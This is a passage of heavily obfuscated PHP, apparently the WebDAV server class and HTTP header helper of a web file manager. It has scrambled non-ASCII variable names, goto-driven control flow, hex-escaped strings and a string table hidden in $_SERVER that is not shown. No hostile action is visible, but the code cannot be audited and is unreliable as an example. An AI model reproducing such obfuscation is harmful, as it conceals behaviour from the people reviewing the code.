mkdir($F…áÄõ”‰õ, 511, !0); } public function pathInfo($E‹Ì¶‹¸ÌÎ) { return path_info($E‹Ì¶‹¸ÌÎ); } public function pathList($AËÂ“‚ƒó¦) { return path_list($AËÂ“‚ƒó¦); } public function pathOut($F˜ÜŠ…ÂÓÇ) { echo file_get_contents($F˜ÜŠ…ÂÓÇ); } public function pathPut($a§äÒÅ¯Ê¸, $câÖ»Øï¥ø = '') { if (!$câÖ»Øï¥ø) { return file_put_contents($a§äÒÅ¯Ê¸, $_SERVER[åÌÛ»ô¢‚ö™][33]); } return move_path($câÖ»Øï¥ø, $a§äÒÅ¯Ê¸); } public function pathRemove($e„ºå²Û²á) { if (is_file($e„ºå²Û²á)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($e³ÍÔï˜‚Æ, $A—Ú¯ÙâÅ´) { return move_path($e³ÍÔï˜‚Æ, $A—Ú¯ÙâÅ´); } public function pathCopy($f¼¤ÅÑà¹, $b–ØÓğˆÉï) { return copy_dir($f¼¤ÅÑà¹, $b–ØÓğˆÉï); } public function parsePath($e¦ÌŒçÃ³¯) { return $e¦ÌŒçÃ³¯; } public function parseItem($e‹µ÷‰ØÄ¹, $Ağ†Š£Âïº) { goto f×·Áƒò†Ï; E†³«ÌÀ¾ƒ: $AÜ‰‹å‘ = array($eğÔ¯ˆ‘ÄÑ[1821] => KodIO::clear($this->urlBase . $dÜÃßøÍ®Ş), $eğÔ¯ˆ‘ÄÑ[107] => @gmdate($eğÔ¯ˆ‘ÄÑ[1822], $e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[107]]), $eğÔ¯ˆ‘ÄÑ[200] => @gmdate($eğÔ¯ˆ‘ÄÑ[1823], $e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[200]]), $eğÔ¯ˆ‘ÄÑ[77] => $e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[77]] ? $e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[77]] : 0); return $AÜ‰‹å‘; goto e¶Ù¢é°; eˆÉÏãË©É: if ($Ağ†Š£Âïº) { $dÜÃßøÍ®Ş = $eğÔ¯ˆ‘ÄÑ[8] . str_replace($eğÔ¯ˆ‘ÄÑ[176], $eğÔ¯ˆ‘ÄÑ[8], rawurlencode($this->pathGet())); } if (!trim($e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[107]])) { $e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[107]] = time(); } if (!trim($e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[200]])) { $e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[200]] = time(); } goto E†³«ÌÀ¾ƒ; f×·Áƒò†Ï: $eğÔ¯ˆ‘ÄÑ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÜÃßøÍ®Ş = $this->pathGet() . $eğÔ¯ˆ‘ÄÑ[8] . $e‹µ÷‰ØÄ¹[$eğÔ¯ˆ‘ÄÑ[28]]; $dÜÃßøÍ®Ş = $eğÔ¯ˆ‘ÄÑ[8] . str_replace($eğÔ¯ˆ‘ÄÑ[176], $eğÔ¯ˆ‘ÄÑ[8], rawurlencode($dÜÃßøÍ®Ş)); goto eˆÉÏãË©É; e¶Ù¢é°: } public function parseItemXml($FŠ…²â·, $a°‡•¹¾“¬) { $d”…ÚÉåÖ¸ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A¹êá‚‡„Ş = $this->parseItem($FŠ…²â·, $a°‡•¹¾“¬); if ($FŠ…²â·[$d”…ÚÉåÖ¸[29]] == $d”…ÚÉåÖ¸[76]) { $DÄ®»ó¤µ = $d”…ÚÉåÖ¸[1824]; $DÄ®»ó¤µ .= $d”…ÚÉåÖ¸[1825]; } else { $dõ‘ÌÏ„ÍŠ = $FŠ…²â·[$d”…ÚÉåÖ¸[165]] ? $FŠ…²â·[$d”…ÚÉåÖ¸[165]] : get_path_ext($FŠ…²â·[$d”…ÚÉåÖ¸[28]]); $CÚ„œ‘™ì© = get_file_mime($dõ‘ÌÏ„ÍŠ); $DÄ®»ó¤µ = $d”…ÚÉåÖ¸[1826]; $DÄ®»ó¤µ .= "\x3c\x44\72\147\145\164\143\x6f\x6e\164\x65\x6e\164\x74\x79\x70\x65\x3e{$CÚ„œ‘™ì©}\x3c\x2f\x44\72\x67\x65\x74\143\157\156\x74\x65\x6e\x74\x74\x79\160\145\x3e"; } return "\xa\11\11\74\104\72\x72\145\163\x70\157\156\x73\145\x3e\xa\x9\11\x9\74\104\x3a\150\x72\145\x66\76{$A¹êá‚‡„Ş[$d”…ÚÉåÖ¸[1821]]}\74\x2f\x44\x3a\150\162\145\x66\76\xa\11\x9\11\x3c\104\x3a\x70\x72\157\x70\163\x74\x61\164\76\12\x9\x9\x9\11\x3c\x44\72\160\162\157\160\76\xa\11\x9\11\11\x9\74\104\x3a\x67\145\x74\x6c\x61\163\164\x6d\x6f\144\151\146\151\x65\144\x3e{$A¹êá‚‡„Ş[$d”…ÚÉåÖ¸[107]]}\74\x2f\104\x3a\147\145\x74\154\141\x73\164\x6d\157\144\151\146\151\x65\x64\x3e\12\11\x9\11\11\x9\74\104\72\x63\162\x65\x61\164\151\157\x6e\x64\x61\x74\145\x3e{$A¹êá‚‡„Ş[$d”…ÚÉåÖ¸[200]]}\74\x2f\x44\72\143\162\x65\x61\x74\x69\x6f\x6e\144\141\x74\x65\76\xa\11\11\11\x9\11\74\104\72\147\x65\x74\x63\x6f\x6e\164\x65\x6e\164\x6c\x65\x6e\147\164\150\76{$A¹êá‚‡„Ş[$d”…ÚÉåÖ¸[77]]}\x3c\57\104\x3a\147\x65\x74\143\x6f\156\x74\145\x6e\164\154\x65\156\147\x74\x68\76\xa\x9\x9\x9\11\11{$DÄ®»ó¤µ}\12\x9\11\11\x9\74\x2f\x44\72\x70\x72\157\160\x3e\12\11\x9\x9\11\x3c\104\72\x73\x74\141\164\165\x73\76\110\x54\124\120\x2f\x31\56\x31\x20\x32\60\x30\40\x4f\113\74\x2f\x44\72\163\164\x61\164\x75\x73\x3e\xa\x9\11\11\x3c\x2f\104\72\160\162\157\x70\163\x74\x61\x74\x3e\12\x9\x9\74\57\x44\72\162\x65\163\160\x6f\x6e\x73\x65\76"; } public function pathListMerge($e©‹µÙ ‡–) { goto FÁ‚ìô¦¶ƒ; c¯Ä×Ö°ñ´: unset($F¤ÇèÃŠ¥Ø); return $aÆ«±Öëçù; goto D™‘¡Ô¤ö; C­°¸Í¨‡ñ: $aÆ«±Öëçù = array(); foreach ($e©‹µÙ ‡– as $EÄÆİêÆ§Å => $a½ùÊ–Å–) { if (!in_array($EÄÆİêÆ§Å, $dÎ§ÉêŒÉ‚) || !is_array($a½ùÊ–Å–)) { continue; } $aÆ«±Öëçù = array_merge($aÆ«±Öëçù, $a½ùÊ–Å–); } foreach ($aÆ«±Öëçù as &$F¤ÇèÃŠ¥Ø) { $F¤ÇèÃŠ¥Ø[$bÅŠÌñøÃÏ[28]] = str_replace($bÅŠÌñøÃÏ[8], $bÅŠÌñøÃÏ[1417], $F¤ÇèÃŠ¥Ø[$bÅŠÌñøÃÏ[28]]); } goto c¯Ä×Ö°ñ´; FÁ‚ìô¦¶ƒ: $bÅŠÌñøÃÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$e©‹µÙ ‡–) { return $e©‹µÙ ‡–; } $dÎ§ÉêŒÉ‚ = array($bÅŠÌñøÃÏ[73], $bÅŠÌñøÃÏ[74], $bÅŠÌñøÃÏ[1827]); goto C­°¸Í¨‡ñ; D™‘¡Ô¤ö: } public function httpPROPFIND() { goto a¬ŞÁÄŠˆè; a¬ŞÁÄŠˆè: $CĞ‡Áà——¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÊÍ³åÂ¦¶ = $this->pathList($this->path); $b¢‘é’¯ãé = $this->pathListMerge($cÊÍ³åÂ¦¶); goto f²¸íÖœÊ; b³†¢Ó­ö: return array($CĞ‡Áà——¢[1830] => 207, $CĞ‡Áà——¢[1831] => "\74\104\x3a\x6d\x75\154\164\151\x73\x74\141\164\x75\x73\40\x78\x6d\x6c\156\x73\72\x44\x3d\42\104\101\x56\x3a\x22\x3e\xa{$DÑÉÍ†Î°»}\12\x3c\57\x44\x3a\x6d\x75\x6c\x74\x69\x73\x74\x61\x74\x75\163\76"); goto bùÂßÃ‘ŸÊ; f²¸íÖœÊ: $Eô‡Şª = $cÊÍ³åÂ¦¶[$CĞ‡Áà——¢[1828]]; if (!is_array($b¢‘é’¯ãé) || $Eô‡Şª[$CĞ‡Áà——¢[1829]] === !1) { return array($CĞ‡Áà——¢[1830] => 404, $CĞ‡Áà——¢[1831] => $CĞ‡Áà——¢[1832]); } $Bˆ¨ÏÜ”† = $Eô‡Şª[$CĞ‡Áà——¢[29]] == $CĞ‡Áà——¢[171] || HttpHeader::get($CĞ‡Áà——¢[1807]) == $CĞ‡Áà——¢[494]; goto BĞÉÚ¹Ä…Š; BĞÉÚ¹Ä…Š: if ($Bˆ¨ÏÜ”†) { $b¢‘é’¯ãé = array($Eô‡Şª); } else { $Eô‡Şª[$CĞ‡Áà——¢[28]] = $CĞ‡Áà——¢[33]; $b¢‘é’¯ãé = array_merge(array($Eô‡Şª), $b¢‘é’¯ãé); } $DÑÉÍ†Î°» = $CĞ‡Áà——¢[33]; foreach ($b¢‘é’¯ãé as $f‡Ç¶«Ş¢) { $DÑÉÍ†Î°» .= $this->parseItemXml($f‡Ç¶«Ş¢, $Bˆ¨ÏÜ”†); } goto b³†¢Ó­ö; bùÂßÃ‘ŸÊ: } public function httpHEAD() { $D†ê¬İ³ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÊäÇä©‰‰ = $this->pathInfo($this->path); if (!$bÊäÇä©‰‰ || $bÊäÇä©‰‰[$D†ê¬İ³ô[29]] == $D†ê¬İ³ô[76]) { return array($D†ê¬İ³ô[1059] => 200, $D†ê¬İ³ô[1234] => array($D†ê¬İ³ô[1833])); } return array($D†ê¬İ³ô[1059] => 200, $D†ê¬İ³ô[1234] => array($D†ê¬İ³ô[1834], $D†ê¬İ³ô[136], $D†ê¬İ³ô[1835] . $bÊäÇä©‰‰[$D†ê¬İ³ô[77]], $D†ê¬İ³ô[1836] . get_file_mime($bÊäÇä©‰‰[$D†ê¬İ³ô[165]]), $D†ê¬İ³ô[132] . gmdate($D†ê¬İ³ô[1822], $bÊäÇä©‰‰[$D†ê¬İ³ô[1279]]) . $D†ê¬İ³ô[1837], $D†ê¬İ³ô[1838])); } public function httpOPTIONS() { $dÈ²ÕŠÓ¥ó =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($dÈ²ÕŠÓ¥ó[1059] => 200, $dÈ²ÕŠÓ¥ó[1234] => array($dÈ²ÕŠÓ¥ó[1839], $dÈ²ÕŠÓ¥ó[1840], $dÈ²ÕŠÓ¥ó[1841], $dÈ²ÕŠÓ¥ó[1289])); } public function httpPROPPATCH() { $b±öœ‚‹³… =& $_SERVER[åÌÛ»ô¢‚ö™]; $c¹¸£ˆÚ = $b±öœ‚‹³…[1842] . $_SERVER[$b±öœ‚‹³…[1415]] . $b±öœ‚‹³…[1843]; return array($b±öœ‚‹³…[1830] => 207, $b±öœ‚‹³…[1831] => "\x3c\104\x3a\x6d\165\154\x74\x69\163\164\x61\x74\x75\163\x20\x78\x6d\x6c\156\x73\72\104\x3d\42\104\x41\126\72\x22\x3e\12{$c¹¸£ˆÚ}\xa\74\x2f\x44\72\x6d\x75\x6c\x74\x69\163\x74\141\164\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $fŠâäÑ˜ß =& $_SERVER[åÌÛ»ô¢‚ö™]; $Dó‹Óƒ’ = $this->uploadFile(); if ($Dó‹Óƒ’) { $fŠéÚ¡™µŞ = 204; } else { $Dó‹Óƒ’ = $fŠâäÑ˜ß[33]; $fŠéÚ¡™µŞ = 201; } $Fê”³óÉ›Ç = $this->pathPut($this->path, $Dó‹Óƒ’); if ($Fê”³óÉ›Ç == !1) { $fŠéÚ¡™µŞ = 404; } return array($fŠâäÑ˜ß[1830] => $fŠéÚ¡™µŞ); } private function uploadFile() { goto eÌëÍÅï”¯; a¤¡‰°ì—È: $F©Ø© –Ó‡ = @fopen($d–Ê®ªÍõ, $AÅ¦Ìš¾˜ƒ[1555]); $A‘Œİ‡‹´í = @fopen($AÅ¦Ìš¾˜ƒ[1845], $AÅ¦Ìš¾˜ƒ[1554]); if (!$A‘Œİ‡‹´í || !$F©Ø© –Ó‡) { @unlink($d–Ê®ªÍõ); return !1; } goto bĞã¯³ôªğ; bĞã¯³ôªğ: while (!feof($A‘Œİ‡‹´í)) { fwrite($F©Ø© –Ó‡, fread($A‘Œİ‡‹´í, 1024 * 200)); } fclose($A‘Œİ‡‹´í); fclose($F©Ø© –Ó‡); goto Bèôñƒ–¢; eÌëÍÅï”¯: $AÅ¦Ìš¾˜ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; @mk_dir(TEMP_FILES); $d–Ê®ªÍõ = TEMP_FILES . $AÅ¦Ìš¾˜ƒ[1844] . rand_string(32); goto a¤¡‰°ì—È; Bèôñƒ–¢: if (@filesize_64($d–Ê®ªÍõ) > 0) { return $d–Ê®ªÍõ; } @unlink($d–Ê®ªÍõ); return !1; goto a¡³¼ŒƒŒ; a¡³¼ŒƒŒ: } public function httpMKCOL() { $aÔËÇ±§Ù¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->pathExists($this->path)) { return array($aÔËÇ±§Ù¨[1059] => 409); } $fŠÀ·ç–òò = $this->pathMkdir($this->path); return array($aÔËÇ±§Ù¨[1059] => $fŠÀ·ç–òò ? 201 : 403); } public function httpMOVE() { $cÌœîæî‘µ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f¯±º„•³ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$cÌœîæî‘µ[1846]])) { $bÃœµÎ†Ş[$cÌœîæî‘µ[1847]] = $_SERVER[$cÌœîæî‘µ[1846]] == $cÌœîæî‘µ[1848]; } $cÏ†¦ÕÃÌÑ = $this->pathMove($this->path, $f¯±º„•³); return array($cÌœîæî‘µ[1059] => $cÏ†¦ÕÃÌÑ ? 201 : 404); } public function httpCOPY() { $eó•ø…®÷ç = $this->parsePath($this->pathGet(!0)); $Fõ„‡‚¨Åâ = $this->pathCopy($this->path, $eó•ø…®÷ç); return array($_SERVER[åÌÛ»ô¢‚ö™][1059] => $Fõ„‡‚¨Åâ ? 201 : 404); } public function httpDELETE() { $cµàÀÄ±ç = $this->pathRemove($this->path); return array($_SERVER[åÌÛ»ô¢‚ö™][1059] => $cµàÀÄ±ç ? 200 : 503); } public function httpLOCK() { $Eßâ•â™ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÜ¢µØ¢•ë = md5($this->path); $cíçê‰‘¢ = $Eßâ•â™[1849] . $this->xmlGet($Eßâ•â™[1850]) . $Eßâ•â™[1851] . $aÜ¢µØ¢•ë . $Eßâ•â™[1852]; return array($Eßâ•â™[1059] => 200, $Eßâ•â™[1234] => array($Eßâ•â™[1853] . $aÜ¢µØ¢•ë, $Eßâ•â™[1854]), $Eßâ•â™[1855] => $cíçê‰‘¢); } public function httpUNLOCK() { return array($_SERVER[åÌÛ»ô¢‚ö™][1059] => 204); } public function xmlGet($f±°ëô¾Ö) { goto D‚ôÂ§Èó; Cª÷©¿ó”ä: $dÁÃÏçÄŠï = explode($C‡¸¾º—š[8], $f±°ëô¾Ö); $F»èŠÊ½ö = array_shift($dÁÃÏçÄŠï); $bÛÑòËÉÃã = $DÓ¥“®„Â->getElementsByTagNameNS($C‡¸¾º—š[1857], $F»èŠÊ½ö); goto Dà‚†·¾À; D‚ôÂ§Èó: $C‡¸¾º—š =& $_SERVER[åÌÛ»ô¢‚ö™]; static $DÓ¥“®„Â = false; if (!$DÓ¥“®„Â) { $f‡İ–½‹¼ã = file_get_contents($C‡¸¾º—š[1856]); $DÓ¥“®„Â = new DOMDocument(); $DÓ¥“®„Â->loadXML($f‡İ–½‹¼ã); } goto Cª÷©¿ó”ä; Dà‚†·¾À: if ($bÛÑòËÉÃã) { return $bÛÑòËÉÃã[0]->nodeValue; } return $C‡¸¾º—š[33]; goto eÙ¯ê›ƒÈœ; eÙ¯ê›ƒÈœ: } public static function response($f‡½³Š©Ïè) { goto e‚‚¦µ‚Ïº; e‚‚¦µ‚Ïº: $fô…ç±â›´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fï™¹÷çì = is_array($f‡½³Š©Ïè[$fô…ç±â›´[1234]]) ? $f‡½³Š©Ïè[$fô…ç±â›´[1234]] : array(); $fï™¹÷çì[] = HttpHeader::code($f‡½³Š©Ïè[$fô…ç±â›´[1059]]); goto A•Ş‡ØÄŒ‰; B£Ü‡Ùéµ±: if (is_string($f‡½³Š©Ïè[$fô…ç±â›´[1855]])) { header($fô…ç±â›´[1858]); $Aµ¶°–éÇ… = $fô…ç±â›´[1859] . $fô…ç±â›´[183] . $f‡½³Š©Ïè[$fô…ç±â›´[1855]]; echo $Aµ¶°–éÇ…; } goto Cé„êæœ; A•Ş‡ØÄŒ‰: $fï™¹÷çì[] = $fô…ç±â›´[1797]; $fï™¹÷çì[] = $fô…ç±â›´[1798]; foreach ($fï™¹÷çì as $BÜº»è ô) { header($BÜº»è ô); } goto B£Ü‡Ùéµ±; Cé„êæœ: } } class HttpHeader { public static $_headers = array("\x48\157\163\x74" => "\x48\124\124\120\137\110\x4f\x53\x54", "\125\x73\145\162\x2d\101\147\145\x6e\x74" => "\x48\124\124\x50\137\x55\123\105\x52\137\x41\107\x45\116\124", "\x43\157\156\x74\x65\156\x74\55\124\x79\x70\x65" => "\110\124\x54\120\137\103\x4f\116\124\x45\x4e\x54\x5f\124\131\x50\105", "\x43\x6f\156\164\145\x6e\x74\x2d\114\145\156\147\x74\150" => "\110\x54\124\x50\137\x43\x4f\116\124\105\116\124\137\x4c\x45\x4e\107\x54\110", "\x44\145\160\x74\x68" => "\x48\124\124\120\x5f\104\x45\x50\124\x48", "\x45\x78\160\x65\143\x74" => "\x48\x54\x54\x50\x5f\x45\x58\x50\105\x43\x54", "\111\x66\x2d\x4e\157\x6e\x65\55\x4d\141\x74\x63\150" => "\x48\x54\124\120\x5f\x49\x46\137\x4e\117\x4e\105\x5f\x4d\101\124\103\110", "\x49\x66\55\115\141\164\x63\150" => "\110\124\124\120\x5f\111\x46\137\x4d\101\124\103\x48", "\x49\x66\55\122\141\156\147\x65" => "\x48\124\x54\120\x5f\x49\x46\x5f\x52\x41\x4e\x47\105", "\114\141\163\164\x2d\x4d\x6f\144\x69\x66\x69\145\144" => "\110\x54\124\x50\x5f\x4c\x41\x53\x54\137\115\117\104\x49\x46\x49\105\x44", "\x49\146\55\115\x6f\x64\151\x66\x69\145\144\x2d\123\151\156\143\145" => "\110\x54\124\x50\x5f\111\106\x5f\115\117\104\x49\106\111\x45\104\137\x53\111\116\x43\x45", "\x49\x66\55\125\x6e\155\157\x64\151\146\x69\x65\144\55\x53\x69\x6e\143\x65" => "\x48\x54\x54\x50\137\x49\x46\137\125\116\115\x4f\104\111\106\111\x45\x44\137\x53\x49\116\x43\105", "\122\141\156\x67\x65" => "\x48\124\124\120\137\122\x41\116\x47\105", "\x54\x69\155\x65\157\165\x74" => "\x48\x54\124\x50\x5f\x54\111\115\105\117\x55\124", "\x49\x66" => "\x48\124\x54\120\137\x49\x46", "\x4c\157\143\x6b\x2d\x54\x6f\153\145\156" => "\110\x54\x54\x50\x5f\114\117\x43\x4b\x5f\x54\x4f\113\105\x4e", "\117\166\145\x72\167\162\x69\x74\x65" => "\110\124\x54\120\x5f\x4f\x56\x45\x52\127\x52\111\124\x45", "\x44\145\x73\164\151\x6e\141\164\151\157\156" => "\110\x54\x54\x50\x5f\104\105\123\124\111\x4e\x41\124\x49\x4f\x4e", "\x52\x65\161\x75\145\x73\164\55\x49\x64" => "\122\105\x51\x55\x45\123\x54\137\x49\104", "\x52\x65\x71\165\x65\x73\164\55\x42\x6f\x64\171\55\x46\x69\154\145" => "\122\105\x51\x55\105\123\124\137\102\x4f\x44\131\137\106\x49\114\105", "\x52\x65\x64\151\x72\x65\143\164\55\123\164\x61\164\165\x73" => "\x52\105\104\111\122\105\103\124\137\123\124\x41\x54\125\x53"); public static function init() { static $dñß¶Ú›Ô = false; if ($dñß¶Ú›Ô) { return; } foreach ($_SERVER as $DÊ÷Ş•‡½ => $cë‡íŠ“Ìì) { $DÊ÷Ş•‡½ = strtoupper($DÊ÷Ş•‡½); if (!array_key_exists($DÊ÷Ş•‡½, $_SERVER)) { continue; } $_SERVER[$DÊ÷Ş•‡½] = $cë‡íŠ“Ìì; } foreach (self::$_headers as $DÊ÷Ş•‡½ => $d¥ëƒ¯…Ù‡) { if (!array_key_exists($DÊ÷Ş•‡½, $_SERVER)) { continue; } $_SERVER[$DÊ÷Ş•‡½] = $_SERVER[$d¥ëƒ¯…Ù‡]; $_SERVER[strtoupper($DÊ÷Ş•‡½)] = $_SERVER[$d¥ëƒ¯…Ù‡]; } } public static function get($c¦òççí›Ë) { self::init(); return $_SERVER[$c¦òççí›Ë] ? $_SERVER[$c¦òççí›Ë] : $_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][1860] . strtoupper($c¦òççí›Ë)]; } public static function method() { return strtoupper(self::get($_SERVER[åÌÛ»ô¢‚ö™][154])); } public static function length() { $fØ¹µ˜Ó¨Ã =& $_SERVER[åÌÛ»ô¢‚ö™]; $c½ãøŸš´ƒ = self::get($fØ¹µ˜Ó¨Ã[1861]); if (!$c½ãøŸš´ƒ) { $c½ãøŸš´ƒ = self::get($fØ¹µ˜Ó¨Ã[1172]); } return $c½ãøŸš´ƒ; } public static function range() { $A¡ÖÊíÔî =& $_SERVER[åÌÛ»ô¢‚ö™]; $EßÇ©··ğ = self::get($A¡ÖÊíÔî[216]); if (!$EßÇ©··ğ) { return !1; } if (!preg_match($A¡ÖÊíÔî[1862], $EßÇ©··ğ, $DïÜ”ÍÌ¢’)) { return !1; } if ($DïÜ”ÍÌ¢’[1] === $A¡ÖÊíÔî[33] && $DïÜ”ÍÌ¢’[2] === $A¡ÖÊíÔî[33]) { return !1; } return array($DïÜ”ÍÌ¢’[1] !== $A¡ÖÊíÔî[33] ? $DïÜ”ÍÌ¢’[1] : null, $DïÜ”ÍÌ¢’[2] !== $A¡ÖÊíÔî[33] ? $DïÜ”ÍÌ¢’[2] : null); } public static $statusCode = array("\x31\60\60" => "\103\157\156\x74\x69\156\x75\145", "\x31\x30\61" => "\123\x77\x69\x74\143\150\x69\x6e\147\40\x50\162\157\164\x6f\x63\157\154", "\61\60\62" => "\120\x72\x6f\143\x65\163\163\151\156\x67", "\61\60\63" => "\x45\x61\x72\x6c\x79\40\110\x69\156\x74\x73", "\x32\60\60" => "\117\x4b", "\62\60\61" => "\103\x72\x65\141\164\145\144", "\x32\x30\62" => "\x41\143\x63\145\160\164\145\144", "\x32\60\x33" => "\x4e\x6f\x6e\55\101\x75\x74\x68\x6f\x72\x69\x74\x61\164\x69\x76\x65\40\x49\x6e\x66\x6f\162\155\x61\x74\151\x6f\156", "\x32\60\x34" => "\x4e\157\x20\103\157\x6e\164\145\156\164", "\62\x30\x35" => "\x52\x65\163\x65\x74\x20\103\157\x6e\x74\x65\x6e\x74", "\62\60\66" => "\120\x61\162\164\x69\x61\x6c\40\103\x6f\x6e\x74\x65\x6e\164", "\x32\60\67" => "\x4d\165\154\x74\x69\x2d\123\164\141\x74\x75\163", "\63\x30\x30" => "\x4d\x75\154\x74\x69\x70\x6c\145\x20\103\x68\x6f\151\143\x65\x73", "\63\x30\61" => "\115\157\x76\x65\x64\40\120\x65\x72\x6d\141\x6e\x65\x6e\164\154\x79", "\63\x30\62" => "\106\x6f\x75\x6e\x64", "\x33\60\x33" => "\123\x65\x65\40\117\x74\150\x65\x72", "\63\x30\x34" => "\x4e\157\164\x20\115\x6f\x64\x69\x66\x69\x65\144", "\63\60\65" => "\x55\x73\x65\40\x50\162\x6f\x78\171", "\x33\x30\67" => "\x54\145\155\160\157\162\x61\x72\x79\x20\122\x65\144\151\162\145\x63\x74", "\63\60\x38" => "\x50\x65\162\x6d\141\x6e\x65\x6e\x74\40\x52\145\x64\151\162\145\x63\164", "\64\x30\x30" => "\x42\141\x64\x20\122\x65\x71\x75\145\x73\x74", "\x34\x30\61" => "\x55\156\x61\165\164\x68\x6f\x72\x69\172\145\x64", "\64\x30\62" => "\x50\141\x79\x6d\145\x6e\164\40\x52\x65\x71\x75\x69\162\145\x64", "\x34\60\63" => "\x46\x6f\x72\x62\151\144\x64\x65\x6e", "\64\x30\64" => "\x4e\x6f\x74\x20\x46\157\x75\x6e\144", "\64\x30\65" => "\x4d\145\164\150\157\144\x20\x4e\157\164\x20\x41\x6c\154\157\167\145\x64", "\64\x30\x36" => "\116\157\x74\x20\x41\143\x63\x65\160\164\141\x62\x6c\x65", "\x34\60\67" => "\120\162\157\170\171\40\101\165\x74\150\x65\x6e\x74\x69\x63\141\x74\151\157\x6e\x20\122\145\x71\x75\x69\162\145\144", "\64\x30\70" => "\122\x65\161\x75\145\x73\x74\x20\x54\x69\x6d\145\x6f\x75\164", "\x34\x30\x39" => "\103\x6f\x6e\146\154\x69\x63\164", "\64\61\60" => "\x47\x6f\x6e\x65", "\64\x31\x31" => "\114\145\x6e\x67\x74\x68\40\122\145\161\x75\x69\x72\145\x64", "\x34\x31\62" => "\120\162\x65\143\x6f\156\x64\x69\164\151\157\x6e\x20\106\141\x69\x6c\145\x64", "\64\x31\63" => "\x52\x65\x71\165\145\163\x74\40\105\x6e\x74\x69\164\171\x20\x54\x6f\x6f\x20\114\x61\162\x67\145", "\64\x31\64" => "\122\x65\x71\165\x65\x73\x74\x20\x55\x52\111\x20\x54\157\157\40\114\141\x72\x67\x65", "\x34\x31\x35" => "\x55\156\x73\165\160\x70\157\162\x74\x65\x64\x20\115\x65\x64\151\141\40\x54\x79\x70\x65", "\x34\x31\x36" => "\x52\x65\x71\x75\x65\163\x74\145\144\x20\122\x61\156\x67\145\40\116\x6f\164\40\x53\141\164\x69\163\x66\151\x61\142\x6c\145", "\64\61\67" => "\105\x78\160\145\x63\x74\141\x74\x69\x6f\x6e\40\106\x61\151\x6c\x65\x64", "\64\62\x32" => "\x55\156\160\x72\157\x63\x65\x73\x73\x61\142\154\x65\40\x45\x6e\x74\x69\164\171", "\x34\x32\63" => "\114\x6f\x63\x6b\145\144", "\x34\x32\64" => "\x46\x61\151\154\145\144\x20\104\145\x70\145\x6e\x64\145\x6e\143\171", "\64\62\x35" => "\x55\156\157\x72\x64\x65\x72\145\x64\x20\103\157\x6c\x6c\145\143\x74\151\157\156", "\64\62\66" => "\125\160\147\x72\x61\144\x65\40\122\145\161\x75\x69\x72\x65\144", "\x34\62\70" => "\120\x72\145\143\157\x6e\x64\x69\x74\x69\157\x6e\40\122\x65\161\x75\x69\x72\x65\x64", "\64\62\x39" => "\124\x6f\157\40\115\141\156\171\40\x52\x65\161\165\x65\163\164\x73", "\64\63\61" => "\x52\145\161\x75\x65\163\x74\40\110\145\x61\144\145\x72\x20\106\x69\x65\154\x64\163\40\x54\157\x6f\x20\x4c\x61\x72\x67\x65", "\x34\64\x34" => "\116\157\40\x52\145\163\160\x6f\x6e\x73\145", "\x34\65\x30" => "\x42\x6c\157\143\153\x65\x64\40\142\171\40\127\x69\x6e\x64\157\x77\x73\40\120\141\162\x65\156\164\141\x6c\40\103\x6f\x6e\164\162\157\154\163", "\x34\x35\x31" => "\125\x6e\x61\166\x61\151\x6c\141\x62\154\x65\x20\x46\x6f\x72\x20\114\145\147\x61\x6c\x20\x52\145\x61\x73\x6f\156\163", "\64\71\x34" => "\x52\145\x71\165\x65\163\164\40\110\x65\141\144\145\x72\x20\124\x6f\157\x20\114\141\162\x67\x65", "\x35\x30\x30" => "\x49\156\x74\145\x72\156\141\x6c\40\x53\x65\x72\166\145\x72\40\105\162\162\157\162", "\65\x30\x31" => "\x4e\x6f\x74\x20\x49\155\x70\x6c\145\x6d\x65\156\x74\145\x64", "\x35\60\62" => "\102\x61\x64\40\x47\x61\164\145\167\141\x79", "\x35\x30\x33" => "\x53\145\x72\x76\151\143\145\x20\x55\x6e\141\x76\141\x69\x6c\x61\x62\154\145", "\x35\60\64" => "\107\141\x74\145\167\x61\x79\40\124\151\x6d\145\x6f\165\x74", "\65\x30\x35" => "\x48\x54\124\x50\x20\126\145\x72\163\x69\157\x6e\40\156\x6f\164\x20\x73\165\x70\x70\x6f\x72\x74\145\144", "\x35\x30\67" => "\x49\x6e\163\165\x66\146\151\x63\x69\145\156\x74\x20\x53\x74\x6f\162\141\x67\x65"); public static function code($D¿¹½¬«ø) { $cîšõ¾ô¹Õ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¿¹½¬«ø = $D¿¹½¬«ø . $cîšõ¾ô¹Õ[33]; $e©êñïÈ¨ = self::$statusCode[$D¿¹½¬«ø]; $e©êñïÈ¨ = $e©êñïÈ¨ ? "\x48\x54\x54\120\x2f\x31\x2e\x31\x20{$D¿¹½¬«ø}\40" . $e©êñïÈ¨ : $cîšõ¾ô¹Õ[33]; return $e©êñïÈ¨; } } goto e…±«‘Ì³É; E°­¾‹µÔ¡: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\x72\143\145\x5f\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\124\x69\155\145", "\164\x69\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\165\x6e\x63\164\x69\x6f\156"), 